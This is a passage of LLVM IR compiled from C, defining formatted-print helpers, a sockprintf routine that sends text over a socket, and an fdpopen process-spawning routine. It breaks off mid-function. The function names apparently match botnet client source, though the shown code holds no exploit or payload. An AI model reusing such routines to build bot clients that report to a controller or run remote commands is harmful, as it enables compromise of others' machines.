  %72 = load i8, i8* %71, align 1
  %73 = zext i8 %72 to i32
  %74 = sub nsw i32 %73, 48
  %75 = load i32, i32* %7, align 4
  %76 = add nsw i32 %75, %74
  store i32 %76, i32* %7, align 4
  br label %77

; <label>:77:                                     ; preds = %68
  %78 = load i8*, i8** %5, align 8
  %79 = getelementptr inbounds i8, i8* %78, i32 1
  store i8* %79, i8** %5, align 8
  br label %56

; <label>:80:                                     ; preds = %66
  %81 = load i8*, i8** %5, align 8
  %82 = load i8, i8* %81, align 1
  %83 = zext i8 %82 to i32
  %84 = icmp eq i32 %83, 115
  br i1 %84, label %85, label %119

; <label>:85:                                     ; preds = %80
  %86 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %87 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 0
  %88 = load i32, i32* %87, align 8
  %89 = icmp ule i32 %88, 40
  br i1 %89, label %90, label %96

; <label>:90:                                     ; preds = %85
  %91 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 3
  %92 = load i8*, i8** %91, align 8
  %93 = getelementptr i8, i8* %92, i32 %88
  %94 = bitcast i8* %93 to i32*
  %95 = add i32 %88, 8
  store i32 %95, i32* %87, align 8
  br label %101

; <label>:96:                                     ; preds = %85
  %97 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 2
  %98 = load i8*, i8** %97, align 8
  %99 = bitcast i8* %98 to i32*
  %100 = getelementptr i8, i8* %98, i32 8
  store i8* %100, i8** %97, align 8
  br label %101

; <label>:101:                                    ; preds = %96, %90
  %102 = phi i32* [ %94, %90 ], [ %99, %96 ]
  %103 = load i32, i32* %102, align 4
  %104 = sext i32 %103 to i64
  %105 = inttoptr i64 %104 to i8*
  store i8* %105, i8** %11, align 8
  %106 = load i8**, i8*** %4, align 8
  %107 = load i8*, i8** %11, align 8
  %108 = icmp ne i8* %107, null
  br i1 %108, label %109, label %111

; <label>:109:                                    ; preds = %101
  %110 = load i8*, i8** %11, align 8
  br label %112

; <label>:111:                                    ; preds = %101
  br label %112

; <label>:112:                                    ; preds = %111, %109
  %113 = phi i8* [ %110, %109 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.500, i32 0, i32 0), %111 ]
  %114 = load i32, i32* %7, align 4
  %115 = load i32, i32* %8, align 4
  %116 = call i32 @prints(i8** %106, i8* %113, i32 %114, i32 %115)
  %117 = load i32, i32* %9, align 4
  %118 = add nsw i32 %117, %116
  store i32 %118, i32* %9, align 4
  br label %283

; <label>:119:                                    ; preds = %80
  %120 = load i8*, i8** %5, align 8
  %121 = load i8, i8* %120, align 1
  %122 = zext i8 %121 to i32
  %123 = icmp eq i32 %122, 100
  br i1 %123, label %124, label %149

; <label>:124:                                    ; preds = %119
  %125 = load i8**, i8*** %4, align 8
  %126 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %127 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 0
  %128 = load i32, i32* %127, align 8
  %129 = icmp ule i32 %128, 40
  br i1 %129, label %130, label %136

; <label>:130:                                    ; preds = %124
  %131 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 3
  %132 = load i8*, i8** %131, align 8
  %133 = getelementptr i8, i8* %132, i32 %128
  %134 = bitcast i8* %133 to i32*
  %135 = add i32 %128, 8
  store i32 %135, i32* %127, align 8
  br label %141

; <label>:136:                                    ; preds = %124
  %137 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 2
  %138 = load i8*, i8** %137, align 8
  %139 = bitcast i8* %138 to i32*
  %140 = getelementptr i8, i8* %138, i32 8
  store i8* %140, i8** %137, align 8
  br label %141

; <label>:141:                                    ; preds = %136, %130
  %142 = phi i32* [ %134, %130 ], [ %139, %136 ]
  %143 = load i32, i32* %142, align 4
  %144 = load i32, i32* %7, align 4
  %145 = load i32, i32* %8, align 4
  %146 = call i32 @printi(i8** %125, i32 %143, i32 10, i32 1, i32 %144, i32 %145, i32 97)
  %147 = load i32, i32* %9, align 4
  %148 = add nsw i32 %147, %146
  store i32 %148, i32* %9, align 4
  br label %283

; <label>:149:                                    ; preds = %119
  %150 = load i8*, i8** %5, align 8
  %151 = load i8, i8* %150, align 1
  %152 = zext i8 %151 to i32
  %153 = icmp eq i32 %152, 120
  br i1 %153, label %154, label %179

; <label>:154:                                    ; preds = %149
  %155 = load i8**, i8*** %4, align 8
  %156 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %157 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 0
  %158 = load i32, i32* %157, align 8
  %159 = icmp ule i32 %158, 40
  br i1 %159, label %160, label %166

; <label>:160:                                    ; preds = %154
  %161 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 3
  %162 = load i8*, i8** %161, align 8
  %163 = getelementptr i8, i8* %162, i32 %158
  %164 = bitcast i8* %163 to i32*
  %165 = add i32 %158, 8
  store i32 %165, i32* %157, align 8
  br label %171

; <label>:166:                                    ; preds = %154
  %167 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 2
  %168 = load i8*, i8** %167, align 8
  %169 = bitcast i8* %168 to i32*
  %170 = getelementptr i8, i8* %168, i32 8
  store i8* %170, i8** %167, align 8
  br label %171

; <label>:171:                                    ; preds = %166, %160
  %172 = phi i32* [ %164, %160 ], [ %169, %166 ]
  %173 = load i32, i32* %172, align 4
  %174 = load i32, i32* %7, align 4
  %175 = load i32, i32* %8, align 4
  %176 = call i32 @printi(i8** %155, i32 %173, i32 16, i32 0, i32 %174, i32 %175, i32 97)
  %177 = load i32, i32* %9, align 4
  %178 = add nsw i32 %177, %176
  store i32 %178, i32* %9, align 4
  br label %283

; <label>:179:                                    ; preds = %149
  %180 = load i8*, i8** %5, align 8
  %181 = load i8, i8* %180, align 1
  %182 = zext i8 %181 to i32
  %183 = icmp eq i32 %182, 88
  br i1 %183, label %184, label %209

; <label>:184:                                    ; preds = %179
  %185 = load i8**, i8*** %4, align 8
  %186 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %187 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 0
  %188 = load i32, i32* %187, align 8
  %189 = icmp ule i32 %188, 40
  br i1 %189, label %190, label %196

; <label>:190:                                    ; preds = %184
  %191 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 3
  %192 = load i8*, i8** %191, align 8
  %193 = getelementptr i8, i8* %192, i32 %188
  %194 = bitcast i8* %193 to i32*
  %195 = add i32 %188, 8
  store i32 %195, i32* %187, align 8
  br label %201

; <label>:196:                                    ; preds = %184
  %197 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 2
  %198 = load i8*, i8** %197, align 8
  %199 = bitcast i8* %198 to i32*
  %200 = getelementptr i8, i8* %198, i32 8
  store i8* %200, i8** %197, align 8
  br label %201

; <label>:201:                                    ; preds = %196, %190
  %202 = phi i32* [ %194, %190 ], [ %199, %196 ]
  %203 = load i32, i32* %202, align 4
  %204 = load i32, i32* %7, align 4
  %205 = load i32, i32* %8, align 4
  %206 = call i32 @printi(i8** %185, i32 %203, i32 16, i32 0, i32 %204, i32 %205, i32 65)
  %207 = load i32, i32* %9, align 4
  %208 = add nsw i32 %207, %206
  store i32 %208, i32* %9, align 4
  br label %283

; <label>:209:                                    ; preds = %179
  %210 = load i8*, i8** %5, align 8
  %211 = load i8, i8* %210, align 1
  %212 = zext i8 %211 to i32
  %213 = icmp eq i32 %212, 117
  br i1 %213, label %214, label %239

; <label>:214:                                    ; preds = %209
  %215 = load i8**, i8*** %4, align 8
  %216 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %217 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 0
  %218 = load i32, i32* %217, align 8
  %219 = icmp ule i32 %218, 40
  br i1 %219, label %220, label %226

; <label>:220:                                    ; preds = %214
  %221 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 3
  %222 = load i8*, i8** %221, align 8
  %223 = getelementptr i8, i8* %222, i32 %218
  %224 = bitcast i8* %223 to i32*
  %225 = add i32 %218, 8
  store i32 %225, i32* %217, align 8
  br label %231

; <label>:226:                                    ; preds = %214
  %227 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 2
  %228 = load i8*, i8** %227, align 8
  %229 = bitcast i8* %228 to i32*
  %230 = getelementptr i8, i8* %228, i32 8
  store i8* %230, i8** %227, align 8
  br label %231

; <label>:231:                                    ; preds = %226, %220
  %232 = phi i32* [ %224, %220 ], [ %229, %226 ]
  %233 = load i32, i32* %232, align 4
  %234 = load i32, i32* %7, align 4
  %235 = load i32, i32* %8, align 4
  %236 = call i32 @printi(i8** %215, i32 %233, i32 10, i32 0, i32 %234, i32 %235, i32 97)
  %237 = load i32, i32* %9, align 4
  %238 = add nsw i32 %237, %236
  store i32 %238, i32* %9, align 4
  br label %283

; <label>:239:                                    ; preds = %209
  %240 = load i8*, i8** %5, align 8
  %241 = load i8, i8* %240, align 1
  %242 = zext i8 %241 to i32
  %243 = icmp eq i32 %242, 99
  br i1 %243, label %244, label %273

; <label>:244:                                    ; preds = %239
  %245 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %246 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 0
  %247 = load i32, i32* %246, align 8
  %248 = icmp ule i32 %247, 40
  br i1 %248, label %249, label %255

; <label>:249:                                    ; preds = %244
  %250 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 3
  %251 = load i8*, i8** %250, align 8
  %252 = getelementptr i8, i8* %251, i32 %247
  %253 = bitcast i8* %252 to i32*
  %254 = add i32 %247, 8
  store i32 %254, i32* %246, align 8
  br label %260

; <label>:255:                                    ; preds = %244
  %256 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 2
  %257 = load i8*, i8** %256, align 8
  %258 = bitcast i8* %257 to i32*
  %259 = getelementptr i8, i8* %257, i32 8
  store i8* %259, i8** %256, align 8
  br label %260

; <label>:260:                                    ; preds = %255, %249
  %261 = phi i32* [ %253, %249 ], [ %258, %255 ]
  %262 = load i32, i32* %261, align 4
  %263 = trunc i32 %262 to i8
  %264 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %263, i8* %264, align 1
  %265 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %265, align 1
  %266 = load i8**, i8*** %4, align 8
  %267 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %268 = load i32, i32* %7, align 4
  %269 = load i32, i32* %8, align 4
  %270 = call i32 @prints(i8** %266, i8* %267, i32 %268, i32 %269)
  %271 = load i32, i32* %9, align 4
  %272 = add nsw i32 %271, %270
  store i32 %272, i32* %9, align 4
  br label %283

; <label>:273:                                    ; preds = %239
  br label %282

; <label>:274:                                    ; preds = %17
  br label %275

; <label>:275:                                    ; preds = %274, %35
  %276 = load i8**, i8*** %4, align 8
  %277 = load i8*, i8** %5, align 8
  %278 = load i8, i8* %277, align 1
  %279 = zext i8 %278 to i32
  call void @printchar(i8** %276, i32 %279)
  %280 = load i32, i32* %9, align 4
  %281 = add nsw i32 %280, 1
  store i32 %281, i32* %9, align 4
  br label %282

; <label>:282:                                    ; preds = %275, %273
  br label %283

; <label>:283:                                    ; preds = %282, %260, %231, %201, %171, %141, %112
  %284 = load i8*, i8** %5, align 8
  %285 = getelementptr inbounds i8, i8* %284, i32 1
  store i8* %285, i8** %5, align 8
  br label %12

; <label>:286:                                    ; preds = %29, %12
  %287 = load i8**, i8*** %4, align 8
  %288 = icmp ne i8** %287, null
  br i1 %288, label %289, label %292

; <label>:289:                                    ; preds = %286
  %290 = load i8**, i8*** %4, align 8
  %291 = load i8*, i8** %290, align 8
  store i8 0, i8* %291, align 1
  br label %292

; <label>:292:                                    ; preds = %289, %286
  %293 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %294 = bitcast %struct.__va_list_tag* %293 to i8*
  call void @llvm.va_end(i8* %294)
  %295 = load i32, i32* %9, align 4
  ret i32 %295
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %42

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %24, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %27

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %11, align 4
  br label %24

; <label>:24:                                     ; preds = %21
  %25 = load i8*, i8** %12, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %12, align 8
  br label %17

; <label>:27:                                     ; preds = %17
  %28 = load i32, i32* %11, align 4
  %29 = load i32, i32* %7, align 4
  %30 = icmp sge i32 %28, %29
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %27
  store i32 0, i32* %7, align 4
  br label %36

; <label>:32:                                     ; preds = %27
  %33 = load i32, i32* %11, align 4
  %34 = load i32, i32* %7, align 4
  %35 = sub nsw i32 %34, %33
  store i32 %35, i32* %7, align 4
  br label %36

; <label>:36:                                     ; preds = %32, %31
  %37 = load i32, i32* %8, align 4
  %38 = and i32 %37, 2
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %40, label %41

; <label>:40:                                     ; preds = %36
  store i32 48, i32* %10, align 4
  br label %41

; <label>:41:                                     ; preds = %40, %36
  br label %42

; <label>:42:                                     ; preds = %41, %4
  %43 = load i32, i32* %8, align 4
  %44 = and i32 %43, 1
  %45 = icmp ne i32 %44, 0
  br i1 %45, label %59, label %46

; <label>:46:                                     ; preds = %42
  br label %47

; <label>:47:                                     ; preds = %55, %46
  %48 = load i32, i32* %7, align 4
  %49 = icmp sgt i32 %48, 0
  br i1 %49, label %50, label %58

; <label>:50:                                     ; preds = %47
  %51 = load i8**, i8*** %5, align 8
  %52 = load i32, i32* %10, align 4
  call void @printchar(i8** %51, i32 %52)
  %53 = load i32, i32* %9, align 4
  %54 = add nsw i32 %53, 1
  store i32 %54, i32* %9, align 4
  br label %55

; <label>:55:                                     ; preds = %50
  %56 = load i32, i32* %7, align 4
  %57 = add nsw i32 %56, -1
  store i32 %57, i32* %7, align 4
  br label %47

; <label>:58:                                     ; preds = %47
  br label %59

; <label>:59:                                     ; preds = %58, %42
  br label %60

; <label>:60:                                     ; preds = %71, %59
  %61 = load i8*, i8** %6, align 8
  %62 = load i8, i8* %61, align 1
  %63 = icmp ne i8 %62, 0
  br i1 %63, label %64, label %74

; <label>:64:                                     ; preds = %60
  %65 = load i8**, i8*** %5, align 8
  %66 = load i8*, i8** %6, align 8
  %67 = load i8, i8* %66, align 1
  %68 = zext i8 %67 to i32
  call void @printchar(i8** %65, i32 %68)
  %69 = load i32, i32* %9, align 4
  %70 = add nsw i32 %69, 1
  store i32 %70, i32* %9, align 4
  br label %71

; <label>:71:                                     ; preds = %64
  %72 = load i8*, i8** %6, align 8
  %73 = getelementptr inbounds i8, i8* %72, i32 1
  store i8* %73, i8** %6, align 8
  br label %60

; <label>:74:                                     ; preds = %60
  br label %75

; <label>:75:                                     ; preds = %83, %74
  %76 = load i32, i32* %7, align 4
  %77 = icmp sgt i32 %76, 0
  br i1 %77, label %78, label %86

; <label>:78:                                     ; preds = %75
  %79 = load i8**, i8*** %5, align 8
  %80 = load i32, i32* %10, align 4
  call void @printchar(i8** %79, i32 %80)
  %81 = load i32, i32* %9, align 4
  %82 = add nsw i32 %81, 1
  store i32 %82, i32* %9, align 4
  br label %83

; <label>:83:                                     ; preds = %78
  %84 = load i32, i32* %7, align 4
  %85 = add nsw i32 %84, -1
  store i32 %85, i32* %7, align 4
  br label %75

; <label>:86:                                     ; preds = %75
  %87 = load i32, i32* %9, align 4
  ret i32 %87
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %102

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %45

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %45

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %45

; <label>:42:                                     ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = sub nsw i32 0, %43
  store i32 %44, i32* %21, align 4
  br label %45

; <label>:45:                                     ; preds = %42, %39, %36, %33
  %46 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %47 = getelementptr inbounds i8, i8* %46, i64 12
  %48 = getelementptr inbounds i8, i8* %47, i64 -1
  store i8* %48, i8** %17, align 8
  %49 = load i8*, i8** %17, align 8
  store i8 0, i8* %49, align 1
  br label %50

; <label>:50:                                     ; preds = %65, %45
  %51 = load i32, i32* %21, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %74

; <label>:53:                                     ; preds = %50
  %54 = load i32, i32* %21, align 4
  %55 = load i32, i32* %11, align 4
  %56 = urem i32 %54, %55
  store i32 %56, i32* %18, align 4
  %57 = load i32, i32* %18, align 4
  %58 = icmp sge i32 %57, 10
  br i1 %58, label %59, label %65

; <label>:59:                                     ; preds = %53
  %60 = load i32, i32* %15, align 4
  %61 = sub nsw i32 %60, 48
  %62 = sub nsw i32 %61, 10
  %63 = load i32, i32* %18, align 4
  %64 = add nsw i32 %63, %62
  store i32 %64, i32* %18, align 4
  br label %65

; <label>:65:                                     ; preds = %59, %53
  %66 = load i32, i32* %18, align 4
  %67 = add nsw i32 %66, 48
  %68 = trunc i32 %67 to i8
  %69 = load i8*, i8** %17, align 8
  %70 = getelementptr inbounds i8, i8* %69, i32 -1
  store i8* %70, i8** %17, align 8
  store i8 %68, i8* %70, align 1
  %71 = load i32, i32* %11, align 4
  %72 = load i32, i32* %21, align 4
  %73 = udiv i32 %72, %71
  store i32 %73, i32* %21, align 4
  br label %50

; <label>:74:                                     ; preds = %50
  %75 = load i32, i32* %19, align 4
  %76 = icmp ne i32 %75, 0
  br i1 %76, label %77, label %94

; <label>:77:                                     ; preds = %74
  %78 = load i32, i32* %13, align 4
  %79 = icmp ne i32 %78, 0
  br i1 %79, label %80, label %90

; <label>:80:                                     ; preds = %77
  %81 = load i32, i32* %14, align 4
  %82 = and i32 %81, 2
  %83 = icmp ne i32 %82, 0
  br i1 %83, label %84, label %90

; <label>:84:                                     ; preds = %80
  %85 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %85, i32 45)
  %86 = load i32, i32* %20, align 4
  %87 = add nsw i32 %86, 1
  store i32 %87, i32* %20, align 4
  %88 = load i32, i32* %13, align 4
  %89 = add nsw i32 %88, -1
  store i32 %89, i32* %13, align 4
  br label %93

; <label>:90:                                     ; preds = %80, %77
  %91 = load i8*, i8** %17, align 8
  %92 = getelementptr inbounds i8, i8* %91, i32 -1
  store i8* %92, i8** %17, align 8
  store i8 45, i8* %92, align 1
  br label %93

; <label>:93:                                     ; preds = %90, %84
  br label %94

; <label>:94:                                     ; preds = %93, %74
  %95 = load i32, i32* %20, align 4
  %96 = load i8**, i8*** %9, align 8
  %97 = load i8*, i8** %17, align 8
  %98 = load i32, i32* %13, align 4
  %99 = load i32, i32* %14, align 4
  %100 = call i32 @prints(i8** %96, i8* %97, i32 %98, i32 %99)
  %101 = add nsw i32 %95, %100
  store i32 %101, i32* %8, align 4
  br label %102

; <label>:102:                                    ; preds = %94, %25
  %103 = load i32, i32* %8, align 4
  ret i32 %103
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

; <label>:15:                                     ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

; <label>:18:                                     ; preds = %15, %7
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #5

declare i64 @write(i32, i8*, i64) #4

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #5
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.34, i32 0, i32 0), i8* %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* %27) #10
  %29 = call i64 @send(i32 %25, i8* %26, i64 %28, i32 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* %31) #5
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

declare i64 @send(i32, i8*, i64, i32) #4

; Function Attrs: nounwind
declare void @free(i8*) #2

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  %13 = icmp ne i32 %12, 114
  br i1 %13, label %14, label %19

; <label>:14:                                     ; preds = %2
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  %18 = icmp ne i32 %17, 119
  br i1 %18, label %25, label %19

; <label>:19:                                     ; preds = %14, %2
  %20 = load i8*, i8** %5, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %26

; <label>:25:                                     ; preds = %19, %14
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:26:                                     ; preds = %19
  %27 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i32 0, i32 0
  %28 = call i32 @pipe(i32* %27) #5
  %29 = icmp slt i32 %28, 0
  br i1 %29, label %30, label %31

; <label>:30:                                     ; preds = %26
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:31:                                     ; preds = %26
  %32 = load i32*, i32** @fdopen_pids, align 8
  %33 = icmp eq i32* %32, null
  br i1 %33, label %34, label %54

; <label>:34:                                     ; preds = %31
  %35 = call i32 @getdtablesize() #5
  store i32 %35, i32* %8, align 4
  %36 = icmp sle i32 %35, 0
  br i1 %36, label %37, label %38

; <label>:37:                                     ; preds = %34
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:38:                                     ; preds = %34
  %39 = load i32, i32* %8, align 4
  %40 = sext i32 %39 to i64
  %41 = mul i64 %40, 4
  %42 = trunc i64 %41 to i32
  %43 = zext i32 %42 to i64
  %44 = call noalias i8* @malloc(i64 %43) #5
  %45 = bitcast i8* %44 to i32*
  store i32* %45, i32** @fdopen_pids, align 8
  %46 = icmp eq i32* %45, null
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %38
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:48:                                     ; preds = %38
  %49 = load i32*, i32** @fdopen_pids, align 8
  %50 = bitcast i32* %49 to i8*
  %51 = load i32, i32* %8, align 4
  %52 = sext i32 %51 to i64
  %53 = mul i64 %52, 4
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 %53, i32 1, i1 false)
  br label %54

; <label>:54:                                     ; preds = %48, %31
  %55 = call i32 @vfork() #11
  store i32 %55, i32* %9, align 4
  switch i32 %55, label %101 [
    i32 -1, label %56
    i32 0, label %63
  ]

; <label>:56:                                     ; preds = %54
  %57 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %58 = load i32, i32* %57, align 4
  %59 = call i32 @close(i32 %58)
  %60 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %61 = load i32, i32* %60, align 4
